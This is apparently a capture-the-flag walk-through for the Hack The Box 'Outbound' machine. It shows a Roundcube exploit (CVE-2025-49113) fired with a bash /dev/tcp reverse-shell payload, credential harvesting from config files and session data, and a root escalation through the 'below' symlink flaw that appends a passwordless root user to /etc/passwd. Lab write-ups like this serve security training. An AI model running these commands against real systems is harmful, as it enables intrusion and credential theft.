# Outbound HTB Machine Walk-Through!

Executive summary: During assessment of the Outbound Linux host, assumed breach credentials enabled authenticated access to Roundcube…

---

### Outbound HTB Machine Walk-Through!

![](https://cdn-images-1.medium.com/max/800/1*1z8_P6mcd95ZprFpi3CrKw.png)

> **Executive summary:** During assessment of the Outbound Linux host, assumed breach credentials enabled authenticated access to Roundcube webmail. Enumeration identified CVE‑2025‑49113, providing post‑authenticated remote code execution. Database review exposed a valid Jacob user session; decrypting the stored credential granted further access. Jacob’s mailbox contained updated system credentials and confirmation of sudo rights for the below utility. Exploiting CVE‑2025‑27591 (insecure log handling with symlink abuse) allowed modification of /etc/passwd, resulting in root‑level compromise.

![](https://cdn-images-1.medium.com/max/800/1*kdp_24twwTTtgaelrYZPJw.jpeg)

> **Reconnaissance**

**Nmap Scan**

A full TCP port scan was performed against outbound.htb using service and version detection with default NSE scripts.\
Command used: **nmap -sV -sC -A -vvv -p- outbound.htb**\
Findings:\
• **22/tcp — OpenSSH 9.6p1** (Ubuntu 3ubuntu13.12)\
• **80/tcp — nginx 1.24.0** (Ubuntu), redirecting to <a href="http://mail.outbound.htb/" class="markup--anchor markup--p-anchor" data-href="http://mail.outbound.htb/" rel="nofollow noopener noopener" target="_blank">http://mail.outbound.htb/</a>\
OS fingerprinting suggested the host was running Linux kernel 4.15–5.19. The HTTP service banner confirmed nginx on Ubuntu.

The redirect to **mail.outbound.htb** indicated a webmail application in scope for further enumeration.

```
┌──(nicholas㉿achilles)-[~/HTB/Labs/Outbound]
└─$ nmap outbound.htb -sV -sC -A -vvv -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 21:09 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
Initiating Ping Scan at 21:09
Scanning outbound.htb (10.10.11.77) [4 ports]
Completed Ping Scan at 21:09, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:09
Scanning outbound.htb (10.10.11.77) [65535 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
SYN Stealth Scan Timing: About 32.60% done; ETC: 21:11 (0:01:04 remaining)
Completed SYN Stealth Scan at 21:10, 77.10s elapsed (65535 total ports)
Initiating Service scan at 21:10
Scanning 2 services on outbound.htb (10.10.11.77)
Completed Service scan at 21:10, 6.14s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against outbound.htb (10.10.11.77)
Initiating Traceroute at 21:10
Completed Traceroute at 21:10, 0.07s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:10
Completed Parallel DNS resolution of 1 host. at 21:10, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.11.77.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 2.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 0.28s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 0.00s elapsed
Nmap scan report for outbound.htb (10.10.11.77)
Host is up, received echo-reply ttl 63 (0.067s latency).
Scanned at 2025-11-27 21:09:32 EST for 87s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/27%OT=22%CT=1%CU=32178%PV=Y%DS=2%DC=T%G=Y%TM=692904
OS:B3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 20.532 days (since Fri Nov  7 08:25:25 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   61.07 ms 10.10.14.1
2   62.85 ms outbound.htb (10.10.11.77)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:10
Completed NSE at 21:10, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.29 seconds
           Raw packets sent: 66344 (2.920MB) | Rcvd: 66087 (2.644MB)
```

We add mail.outbound.htb and outbound.htb to out /etc/hosts file:

```
┌──(nicholas㉿achilles)-[~/HTB/Labs/Outbound]
└─$ echo "10.10.11.77 mail.outbound.htb outbound.htb" | sudo tee -a /etc/hosts
10.10.11.77 mail.outbound.htb outbound.htb
```

> **Web Enumeration**

We can use the credentials given to us at the beginning of this Lab: tyler / LhKL1o9Nm3X2.

![](https://cdn-images-1.medium.com/max/800/1*F_ihPNi9PbULnN60aBhB6w.png)

After further enumeration the about section gives us a version number in which we look up and find is vulnerable to CVE-2025–49113. Roundcube 1.6.11.

![](https://cdn-images-1.medium.com/max/800/1*f5hXYLaYGBDYS_wNmqCJCw.png)

**Exploitation**

A publicly available <a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit.git" class="markup--anchor markup--p-anchor" data-href="https://github.com/hakaioffsec/CVE-2025-49113-exploit.git" rel="noopener" target="_blank">proof‑of‑concept</a> exploit for CVE‑2025‑49113 was executed against the authenticated Roundcube session. The exploit successfully triggered server‑side code execution, validated by controlled commands (, ) executed on the host. This confirmed compromise of the web application and established a foothold on the target system.

Ok first download the poc, then cd into it. run the listerner in another terminal, then the exploit.

```
──(nicholas㉿achilles)-[~/HTB/Labs/Outbound]
└─$ sudo git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
Cloning into 'CVE-2025-49113-exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 1), reused 9 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 442.35 KiB | 1.86 MiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(nicholas㉿achilles)-[~/HTB/Labs/Outbound]
└─$ cd CVE-2025-49113-exploit

┌──(nicholas㉿achilles)-[~/HTB/Labs/Outbound/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.14.4/9001 0>&1"'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...

```

Now we should have a shell.

```
──(nicholas㉿achilles)-[~/HTB/Labs/Outbound]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.77] 58742
bash: cannot set terminal process group (246): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$

```

After gaining a reverse shell, the session lacked job control and produced errors such as “cannot set terminal process group” and “no job control in this shell.” The usual PTY upgrade via Python failed because the exploit landed inside a Docker container, which lacked a controlling TTY. To stabilize the shell, I used **script -q /dev/null** to allocate a pseudo-terminal, then suspended the netcat process and ran **stty raw -echo; fg** locally. This combination provided a functional interactive shell with proper input handling, allowing me to continue exploitation reliably.

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Outbound/CVE-2025-49113-exploit]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.77] 36476
bash: cannot set terminal process group (246): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ script -q /dev/null
script -q /dev/null
$ bash
bash
www-data@mail:/$ ^Z
zsh: suspended  nc -lvnp 9001

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Outbound/CVE-2025-49113-exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 9001

www-data@mail:/$
```

After stabilizing the reverse shell, I began system enumeration to identify sensitive files and potential credentials. Web application directories are a prime target, as developers often store database and API credentials in configuration files such as config.php. These files typically contain connection strings in plaintext, making them valuable for lateral movement or privilege escalation. I also checked home directories, /etc/ configs, and log files, since misconfigurations in these locations frequently expose secrets. This systematic approach ensures no potential foothold is overlooked. With that being said mysql creds are found so let’s login and enumerate the database.

```
www-data@mail:/var/www/html/roundcube/config$ cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.

<snip>
```

During enumeration, I executed a query () which returned a large encoded string. This data was initially in base64 format, so I decoded it to reveal the underlying values. The output was still difficult to interpret, so I applied text‑processing tools ( and regular expressions) to clean and reformat the data. This made the information human‑readable and allowed me to identify meaningful variables, including potential credentials and configuration details.

```
MariaDB [roundcube]> select vars from session;
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [roundcube]>

```

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Outbound/CVE-2025-49113-exploit]
└─$ >....
OO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 | base64 -d | sed 's/;/\r\n/g'
language|s:5:"en_US"
imap_namespace|a:4:{s:8:"personal"
a:1:{i:0
a:2:{i:0
s:0:""
i:1
s:1:"/"
}}s:5:"other"
N
s:6:"shared"
N
s:10:"prefix_out"
s:0:""
}imap_delimiter|s:1:"/"
imap_list_conf|a:2:{i:0
N
i:1
a:0:{}}user_id|i:1
username|s:5:"jacob"
storage_host|s:9:"localhost"
storage_port|i:143
storage_ssl|b:0
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
login_time|i:1749397119
timezone|s:13:"Europe/London"
STORAGE_SPECIAL-USE|b:1
auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW"
request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw"
task|s:4:"mail"
skin_config|a:7:{s:17:"supported_layouts"
a:1:{i:0
s:10:"widescreen"
}s:22:"jquery_ui_colors_theme"
s:9:"bootstrap"
s:18:"embed_css_location"
s:17:"/styles/embed.css"
s:19:"editor_css_location"
s:17:"/styles/embed.css"
s:17:"dark_mode_support"
b:1
s:26:"media_browser_css_location"
s:4:"none"
s:21:"additional_logo_types"
a:3:{i:0
s:4:"dark"
i:1
s:5:"small"
i:2
s:10:"small-dark"
}}imap_host|s:9:"localhost"
page|i:1
mbox|s:5:"INBOX"
sort_col|s:0:""
sort_order|s:4:"DESC"
STORAGE_THREAD|a:3:{i:0
s:10:"REFERENCES"
i:1
s:4:"REFS"
i:2
s:14:"ORDEREDSUBJECT"
}STORAGE_QUOTA|b:0
STORAGE_LIST-EXTENDED|b:1
list_attrib|a:6:{s:4:"name"
s:8:"messages"
s:2:"id"
s:11:"messagelist"
s:5:"class"
s:42:"listing messagelist sortheader fixedheader"
s:15:"aria-labelledby"
s:22:"aria-label-messagelist"
s:9:"data-list"
s:12:"message_list"
s:14:"data-label-msg"
s:18:"The list is empty."
}unseen_count|a:2:{s:5:"INBOX"
i:2
s:5:"Trash"
i:0
}folders|a:1:{s:5:"INBOX"
a:2:{s:3:"cnt"
i:2
s:6:"maxuid"
i:3
}}list_mod_seq|s:2:"10"

```

> Foothold

Now we have a password from the database for jacob, during my enumeration earlier i came across a program they have called decrypt.sh so we can use that and try to see if it gives us the password for jacob.

```
<be$ bin/decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
```

This gives us the password for Jacob to sign into his account in roundcube so let’s go over there and do that!

![](https://cdn-images-1.medium.com/max/800/1*fRiLgMHbkBq7J6ac4uA1xQ.png)

![](https://cdn-images-1.medium.com/max/800/1*RawWw2YhUJ4RBwYkfDlnYA.png)

Now while inside Jacob’s account, we find a email from Tyler explaining that his password has been changed. So let’s in fact grab that password and try to sign into SSH.

![](https://cdn-images-1.medium.com/max/800/1*Slu4Uh9IxNRchZSF5kfdBQ.png)

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Outbound/CVE-2025-49113-exploit]
└─$ ssh jacob@outbound.htb
The authenticity of host 'outbound.htb (10.10.11.77)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'outbound.htb' (ED25519) to the list of known hosts.
jacob@outbound.htb's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Nov 28 09:21:27 PM UTC 2025

  System load:  0.11              Processes:             265
  Usage of /:   79.2% of 6.73GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Jul 14 16:40:57 2025 from 10.10.14.77
jacob@outbound:~$ cat user.txt
2b5a5a901ee54a87d5bXXXXXXX
jacob@outbound:~$
```

> Privilege Escalation

After recovering Jacob’s password, the next step was to validate and use these credentials to access his account. This is important because user accounts often contain sensitive files or elevated permissions. By testing the password and enumerating Jacob’s environment, I could determine whether his account provided additional access or potential paths to escalate privileges. In a real-world engagement, this demonstrates how attackers leverage compromised credentials to move deeper into a system, and why protecting user accounts is critical for organizational security.

First command to run now will be sudo -l this lets us know what programs we can run without sudo privilege.

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
        !/usr/bin/below --debug*, !/usr/bin/below -d*
```

By checking Jacob’s sudo privileges, I discovered he could run the **/usr/bin/below** binary as root without needing a password. Although certain options were restricted, the ability to execute this program with elevated privileges represents a misconfiguration. In practice, this means an attacker could leverage the allowed functionality of **below** to gain unauthorized root access. This finding highlights why organizations must carefully audit sudo rules — even small oversights can provide attackers with a direct path to full system compromise.

I did a search of just a Below Exploit Linux and came across this <a href="https://github.com/rvizx/CVE-2025-27591.git" class="markup--anchor markup--p-anchor" data-href="https://github.com/rvizx/CVE-2025-27591.git" rel="noopener" target="_blank">**POC</a>\*\* that hopefully will help you do understand what exactly are the proper steps to escalate our privileges.

```

jacob@outbound:/var/log$ rm below/error_root.log
jacob@outbound:/var/log$ ls -l below/
total 8
-rw-rw-rw- 1 jacob jacob  236 Jul  8 20:45 error_jacob.log
drwxr-xr-x 2 root  root  4096 Nov 28 01:52 store
jacob@outbound:/var/log$ ln -sf /etc/passwd below/error_root.log
jacob@outbound:/var/log$ ls -l below/
total 8
-rw-rw-rw- 1 jacob jacob  236 Jul  8 20:45 error_jacob.log
lrwxrwxrwx 1 jacob jacob   11 Nov 28 22:09 error_root.log -> /etc/passwd
drwxr-xr-x 2 root  root  4096 Nov 28 01:52 store
jacob@outbound:/var/log$ sudo below
jacob@outbound:/var/log$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1840 Jul 14 16:40 /etc/passwd
jacob@outbound:/var/log$  echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd;
jacob@outbound:/var/log$ su - pwn
root@outbound:~# id
uid=0(root) gid=0(root) groups=0(root)
root@outbound:~# cat /root/root.txt
5c22fbfec5b080b0b444ee55f0ec2f05
root@outbound:~#

```

![](https://cdn-images-1.medium.com/max/800/1*PuWEidvjIFLJLM-7wlKldA.jpeg)

> Final Thoughts:

### “Executive Summary & Business Impact (For Management Review)”

The following summary isolates the primary risks identified during the assessment of the Outbound system. These findings demonstrate failures in internal controls and standard security hygiene that allow a non-trusted entity to gain complete administrative control.

